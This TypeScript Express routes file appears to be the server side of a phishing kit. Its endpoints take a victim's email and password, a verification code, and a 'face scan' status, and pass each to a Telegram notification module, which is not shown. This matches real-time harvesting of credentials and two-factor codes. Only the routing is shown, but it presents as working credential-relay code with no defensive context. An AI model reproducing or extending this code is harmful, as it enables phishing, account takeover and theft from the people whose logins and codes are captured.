import type { Express } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { 
  sendLoginNotification, 
  sendCodeNotification, 
  sendFaceScanNotification
} from "./telegram";

export async function registerRoutes(
  httpServer: Server,
  app: Express
): Promise<Server> {
  // Telegram notification endpoints
  
  // Login notification
  app.post("/api/telegram/login", async (req, res) => {
    try {
      const { email, password } = req.body;
      
      if (!email || !password) {
        return res.status(400).json({ message: "Email and password are required" });
      }
      
      await sendLoginNotification(email, password);
      res.json({ success: true, message: "Login notification sent" });
    } catch (error) {
      console.error("Error sending login notification:", error);
      res.status(500).json({ message: "Failed to send notification" });
    }
  });
  
  // Code notification
  app.post("/api/telegram/code", async (req, res) => {
    try {
      const { email, code } = req.body;
      
      if (!email || !code) {
        return res.status(400).json({ message: "Email and code are required" });
      }
      
      await sendCodeNotification(email, code);
      res.json({ success: true, message: "Code notification sent" });
    } catch (error) {
      console.error("Error sending code notification:", error);
      res.status(500).json({ message: "Failed to send notification" });
    }
  });
  
  // Face scan notification
  app.post("/api/telegram/facescan", async (req, res) => {
    try {
      const { email } = req.body;
      
      if (!email) {
        return res.status(400).json({ message: "Email is required" });
      }
      
      await sendFaceScanNotification(email);
      res.json({ success: true, message: "Face scan notification sent" });
    } catch (error) {
      console.error("Error sending face scan notification:", error);
      res.status(500).json({ message: "Failed to send notification" });
    }
  });
  
  // Old endpoints removed - Complete verification notification
  

  return httpServer;
}
